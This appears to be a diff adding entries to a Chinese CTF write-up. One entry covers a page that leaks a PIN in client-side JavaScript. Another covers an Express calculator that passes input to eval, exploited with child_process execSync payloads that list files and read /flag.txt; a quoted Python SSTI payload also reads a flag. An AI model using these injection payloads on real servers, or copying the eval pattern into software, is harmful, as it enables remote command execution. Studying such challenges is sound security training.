@@ -94,6 +94,113 @@ ${__import__('os').popen('cat /fla*').read()}
 得到flag
 
 
+### **Trapped Source  被困的源头**
+
+> Intergalactic Ministry of Spies tested Pandora's movement and intelligence abilities. She found herself locked in a room with no apparent means of escape. Her task was to unlock the door and make her way out. Can you help her in opening the door?  
+> 星际间谍部测试了潘多拉的移动和智力能力。她发现自己被困在一个没有明显逃生方法的房间里。她的任务是解锁门并走出去。你能帮她打开门吗？
+
+进入查看 js 代码，发现对应正确密码
+
+```nginx
+	<script>
+		window.CONFIG = window.CONFIG || {
+			buildNumber: "v20190816",
+			debug: false,
+			modelName: "Valencia",
+			correctPin: "5417",
+		}
+	</script>
+```
+
+输入获得 flag
+
+
+
+
+
+### **Breathtaking View  令人惊叹的景色**
+
+> Check out my new website showcasing a breathtaking view—let's hope no one can 'manipulate' it!  
+> 查看我的新网站，展示令人惊叹的景色——希望没有人能“操控”它！
+
+一道 SSJI 的题目
+
+
+
+一个计算器界面
+
+代码审计
+
+```javascript
+const path       = require('path');
+const express    = require('express');
+const router     = express.Router();
+const Calculator = require('../helpers/calculatorHelper');
+
+const response = data => ({ message: data });
+
+router.get('/', (req, res) => {
+  return res.sendFile(path.resolve('views/index.html'));
+});
+
+router.post('/api/calculate', (req, res) => {
+  let { formula } = req.body;
+
+  if (formula) {
+    result = Calculator.calculate(formula);
+    return res.send(response(result));
+  }
+
+  return res.send(response('Missing parameters'));
+})
+
+module.exports = router;
+
+// ocd
+```
+
+看一下这个calculate 函数
+
+```javascript
+module.exports = {
+    calculate(formula) {
+        try {
+            return eval(`(function() { return ${ formula } ;}())`);
+
+        } catch (e) {
+            if (e instanceof SyntaxError) {
+                return 'Something went wrong!';
+            }
+        }
+    }
+}
+
+
+// ocd
+```
+
+![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756994516843-e66d27d4-3c6b-46a2-bcb0-e67e5fc2c7d4.png)
+
+可以执行 js 代码
+
+构造如下，列出当前目录
+
+```html
+process.platform
+
+require('child_process').execSync('ls').toString()
+```
+
+尝试获取 flag
+
+```javascript
+require('child_process').execSync('cat /flag.txt').toString()
+```
+
+![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1756994999793-95b26fcb-b440-4ec3-a3f7-ec6105aac467.png)
+
+得到 flag
+
 
 
 
